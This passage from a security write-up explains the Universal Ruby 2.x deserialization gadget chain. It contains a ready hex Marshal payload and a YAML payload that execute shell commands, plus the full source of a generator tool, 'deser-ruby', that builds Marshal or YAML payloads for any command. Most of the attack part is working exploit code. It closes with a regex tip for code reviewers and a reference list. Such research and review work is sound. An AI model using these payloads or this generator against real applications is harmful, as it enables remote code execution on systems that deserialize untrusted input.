1. Gem::Requirement -> calls @requirements.each (list of object)
2. Gem::DependencyList -> used as list, calls @specs.sort (sort requires a comparator)
3. Gem::Source::SpecificFile -> implements a suitable comparator (<=> three way comparison operator) that calls @spec.name
4. Gem::StubSpecification -> implementation of name calls data.name -> calls Kernel.open(@loaded_from)
5. RCE is achieved by manipulating @loaded_from with a command

The script provided by the researcher, generates the hex version and the base64 version of the payload, for the static command "id". The payload may be found even on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md).

To test it, it is enough to launch the following command:

```bash
$ ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d4922167c636d64202f632063616c6320313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'
```

However, the script provided shows a list of drawbacks:

* **Executes** the payload on the attacker machine multiple times
* Does not offer dynamic generation (with custom commands)
* Can be used only for Marshal payloads

#### Ruby: Text-Based archive format

**YAML**

It may sound trivial, but the same chain can be applied to the `YAML.load()` function as well. If you accessed **PayloadAllTheThings** previously, you probably noticed the following YAML payload:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
```

Now, if you pay attention at it, you will easily understand that it's working exactly the same way as the previously explained payload for Marshal.

The payload has been created by another security researcher name **Etienne Stalmans (aka STRAALDRAAD)**, his full research can be found [here](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/).
However, a as you can read from his research, the payload was created "manually". If you wonder why, the research explained that using the original script for the Marshal payload, of course changing the call to `Marshal.dump` with `YAML.dump`, produced a not working (incomplete) payload. I was personally disappointed by this approach, as the script could easily be fixed.
The main problem was the use of global variables (`$-`prefixed variables) with `YAML.dump`, which force the payload to be executed during serialization (which is necessary to generate the correct payload with `Marshal.dump`), but would prevent the yaml payload from being generated (as an exception would show before the end of the function). Transforming the global variable in a local one, and rebuilding the object for serialization, successfully solved the issue.

#### Generate payloads dynamically: deser-ruby

For the sake of completeness and to provide an example of what I said above, the following tool is provided, named **desert-ruby**, that could be used to dynamically generate valid payloads for both Marshal and YAML of Ruby, using the **Universal Ruby 2.x RCE Gadget Chain**. An up-to-date version of the tool can also be downloaded [here](https://github.com/klezVirus/deser-ruby).

```ruby
#!/usr/bin/env ruby
require 'optparse'
require 'yaml'

Options = Struct.new(:save,:encode,:yaml,:command,:test)

class Parser
  def self.parse(options)
    args = Options.new("Ruby RCE deserialization payload generator")

    opt_parser = OptionParser.new do |opts|
      opts.banner = "Usage: serializer.rb [options]"

      opts.on("-sFILE", "--save=FILE", "File to store payload (default=payload)") do |f|
        args.save = f
      end
      opts.on("-y", "--yaml", "Generate YAML payload (default is False)") do |y|
        args.yaml = y
      end
      opts.on("-t", "--test", "Attempt payload deserialization") do |t|
        args.test = t
      end
      opts.on("-cCOMMAND", "--command=COMMAND", "Command to execute") do |c|
        args.command = c
      end
      opts.on("-eENCODE", "--encode=ENCODE", "Encode payload (base64|hex)") do |e|
        args.encode = e
      end
      opts.on("-h", "--help", "Prints this help") do
        puts opts
        exit
      end
    end

    opt_parser.parse!(options)
    return args
  end
end

class Tester
    def self.test(type, payload, payload_file)
        puts "[*] Deserializing payload "+ type +" in place"
        if type == "yaml" then
            # If we have an exception, we're quite sure we triggered the RCE
            YAML.load(File.read(payload_file)) rescue (puts "[+] Payload Executed Successfully")
        else
            Marshal.load(payload) rescue nil
        end
        puts "[*] Deserializing payload " + type + " in new process"
        if type == "yaml" then
            # If we triggered an exception above, this one should execute the command and print a visible result (and exception)
            cmd_string = "require 'yaml';YAML.load(File.read('"+payload_file+"'))"
            puts cmd_string
            puts IO.popen(["ruby","-e", cmd_string]).read
        else
            cmd_string = "'Marshal.load(STDIN.read) rescue nil'"
            IO.popen(cmd_string, "r+") do |pipe|
                pipe.print payload
                pipe.close_write
                puts pipe.gets
                puts
            end
        end
    end
end

args = Parser.parse ARGV

if not args[:command] then
    abort("[-] Command required")
else
    command_length = args.command.length
    command = "|"+args.command+" 1>&2"
end

class Gem::StubSpecification
    def initialize; end
end

command_tag = "|echo " + "A" * (command_length-5) + " 1>&2"
stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, command_tag)

puts "[+] Building payload"
stub_specification.name rescue nil

class Gem::Source::SpecificFile
    def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

specific_file <=> other_specific_file rescue nil

$dependency_list = Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

$dependency_list.each{} rescue nil
dependency_list = $dependency_list

class Gem::Requirement
    def marshal_dump
        [$dependency_list]
    end
end

payload = Marshal.dump(Gem::Requirement.new)

type = (args.yaml ? "yaml" : "marshal")
if type == "yaml" then
    ext = ".yml"
    gem = Gem::Requirement.new
    gem.instance_variable_set(:@requirements, [dependency_list])
    payload = YAML.dump(gem)
else
    ext = ".raw"
    payload = Marshal.dump(Gem::Requirement.new)
end

payload = payload.gsub(command_tag,command)


if args[:save]
    payload_file = args[:save] + ext
    File.open(payload_file, 'w') { |file| file.write(payload) }
end

if args[:test] then
    puts "[+] Deserializing payload"
    Tester.test(type, payload, payload_file)
end

print args.encode
encode = ( args[:encode] ? args[:encode] : "") 

if encode == "hex" then
    puts "Payload (hex):"
    puts payload.unpack('H*')[0]
    puts
elsif encode == "base64"
    require 'base64'
    puts "Payload (base64):"
    puts Base64.encode64(payload)
    puts
else
    puts "Payload (raw):"
    puts payload
    puts
end
```

We can generate the YAML payload with:

```bash
 ruby serializer.rb -c "cmd /c calc" -y -s payload 
```

To test the payload, run:

```bash
ruby -e "require 'yaml'; YAML.load(File.read('payload.yml'))"
```

A calculator will spawn on the hosting system.

#### Tips for Source Code reviewers

To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: 

* `(Marshal.load|YAML.load)\s*\(`

For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.

#### References

**JAVA**

* [Deserialization - ExploitDB](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf)
* [OWASP London 2017] (https://www.owasp.org/images/a/a3/OWASP-London-2017-May-18-ApostolosGiannakidis-JavaDeserializationTalk.pdf)
* [Marshalsec](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf)
* [Deserialization Defence - LAOIS](https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2017/june/ncc_group_combating_java_deserialization_vulnerabilities_with_look-ahead_object_input_streams1.pdf)
* [Deserialization Cheatsheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
* [DeserLab](https://github.com/NickstaDB/DeserLab)


**.NET**

* [Analyse Binary Serialization Stream](https://stackoverflow.com/questions/3052202/how-to-analyse-contents-of-binary-serialization-stream)
* [ysoserial.net](https://github.com/pwntester/ysoserial.net/)
* [Are you my type?](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
* [Friday the 13th: JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)

**NodeJS**

* [https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

**PHP**

* [Magic-Methods](https://www.php.net/manual/en/language.oop5.magic.php)
* [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

**Python**

* [PyYAML - Exploit-DB](https://www.exploit-db.com/docs/47655)
* [Exploiting jsonpickle](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/)

**Ruby**

* [Universal RCE for Ruby 2.x](https://www.elttam.com/blog/ruby-deserialization/)
* [Universal RCE for Ruby2.x - YAML](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)